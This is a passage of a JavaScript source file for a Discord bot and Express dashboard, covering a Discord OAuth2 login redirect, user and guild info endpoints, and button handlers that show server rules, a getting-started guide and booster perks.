// ------------------------------------

// 0Auth2 Redirect 
app.get('/api/auth/discord/redirect', async (req, res) => {
    const { code } = req.query;
    if (code) {
        const formData = new url.URLSearchParams({
            client_id: process.env.clientid,
            client_secret: process.env.DISCORD_CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code.toString(),
            redirect_uri: `http://localhost:${port}/api/auth/discord/redirect`,
        });
        try {
            const output = await axios.post('https://discord.com/api/v10/oauth2/token',
                formData.toString(), {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
            }
            );

            if (output.data) {
                const access = output.data.access_token;
                const userinfo = await axios.get('https://discord.com/api/v10/users/@me', {
                    headers: {
                        'Authorization': `Bearer ${access}`,
                    },
                });

                // --------
                const guilds = await axios.get('https://discord.com/api/v10/users/@me/guilds', {
                    headers: {
                        'Authorization': `Bearer ${access}`,
                    },
                });

                const avatarUrl = `https://cdn.discordapp.com/avatars/${userinfo.data.id}/${userinfo.data.avatar}.png`;
                console.log(avatarUrl);

                req.session.user = {
                    username: userinfo.data.username,
                    avatar: avatarUrl,
                    guilds: guilds.data
                };

                
                // -------

                res.redirect('/dashboard.html');
            }
        } catch (error) {
            console.error('Error during Oauth2 token exchange', error);
            res.status(500).send('Authentication Failed');
        }
    } else {
        res.status(400).send('No code provided');
    }
});

// -------------------------

app.get('/api/user-info', (req, res) => {
    
    if (req.session.user) {
        console.log('user info sending');
        res.json(req.session.user);
    } else {
        res.status(400).send('Unauthorized');
    }
});

app.get('/api/bot-guilds', async (req, res) => {
    try {
        const botGuilds = await rest.get(Routes.userGuilds());
        res.json(botGuilds);
        
    } catch (error) {
        console.error('Error fetching bot guilds,', error);
    }
})

// ----------------------------

app.listen(port, () => {
    console.log(`Running on http://localhost:${port}`);
});




client.on(Events.InteractionCreate, async interaction => {

    if (interaction.customId !== 'butt1') return;

    const linkbutton = new ActionRowBuilder()
    .addComponents(
        new ButtonBuilder()
        .setLabel('Discord Terms of Service')
        .setURL('https://discord.com/terms')
        .setStyle(ButtonStyle.Link),

        new ButtonBuilder()
        .setLabel('Discord Community Guidelines')
        .setURL('https://discord.com/guidelines')
        .setStyle(ButtonStyle.Link)
    )

    const ruleembed = new EmbedBuilder()
    .setTitle('__SERVER RULES__')
    .setColor('Purple')
    .setDescription('\nHello everyone! Before chit chatting and having fun in the server, check out these rules first!!\n\<:alert1:1254576915621220553> __**CHAT RULES**__\n> \<:alert1:1254576915621220553> Respect everyone.\n> \<:alert1:1254576915621220553> No harassment/bullies/misconduct.\n> \<:alert1:1254576915621220553> Keeping chat __***in all areas***__ appropriate for ~15 yos and up- that includes no pornographic/sexual/violent content, so everyone can feel safe and comfortable.\n> \<:alert1:1254576915621220553> No begging, no scamming, and **DO NOT** share others\' private information (and try not to share too much of your own private info, for your safety).\n> \<:alert1:1254576915621220553> No racism/homophobia/transphobia/offensive slurs. Respect the LGBTQIA+.\n> \<:alert1:1254576915621220553> Voice Chat: Be mindful of the fact that some people are shy, or can\'t always hear well, or don\'t speak English natively - DO NOT make fun of others and try not to talk over others/hog the conversation.\n **These rules also apply to DMing other members of the server privately**.\n\<:alert1:1254576915621220553> __**CHANNEL RULES**__\n> \<:alert1:1254576915621220553> We have specific channels for specific purposes so try to talk/play on the right channels. Chat rules are also applied here.\n ‼️ __**IMPORTANT**__: **DO NOT** ping Staffs/Owner for fun.\n 🚫 **BREAKING THE RULES RESULTS IN PERMANENT BAN.**')

    await interaction.reply({ embeds: [ruleembed], components: [linkbutton], ephemeral: true});

})

client.on(Events.InteractionCreate, async interaction => {

    if (interaction.customId !== 'butt2') return;

    const infoembed = new EmbedBuilder()
    .setTitle('__GETTING STARTED__')
    .setColor('Blurple')
    .setDescription('\nAre you new to the server? Then this Guide is for you, my friend!\n \<a:megashout:1275974971398684715> **Some First Steps:**\n> \<a:megashout:1275974971398684715> Read our rules in the channel.\n> \<a:megashout:1275974971398684715> Choose your wanted channels/roles in # Customize Community - <#1010821053372698685>/<#1078995587694854194>.\n> \<a:megashout:1275974971398684715> Introduce yourself to the Community in https://discord.com/channels/1156775942224625684/1187915233637965904!\n> \<a:megashout:1275974971398684715> If you have any questions, open a ticket!')

    await interaction.reply({ embeds: [infoembed], ephemeral: true });
})

client.on(Events.InteractionCreate, async interaction => {
    
    if (interaction.customId !== 'butt3') return;

    const perkembed = new EmbedBuilder()
    .setTitle('__SERVER PERKS__')
    .setColor('Purple')
    .setDescription('• Check out these cool perks you may get!')
    .addFields({ name: '⁕ Booster Perks', value: '\n• Access to Private Channel/Custom Role!\n• Assigns <@&1156809052362391563>!'})
    .setFooter({ text: `${interaction.guild.name}`})

    await interaction.reply({ embeds: [perkembed], ephemeral: true});
})
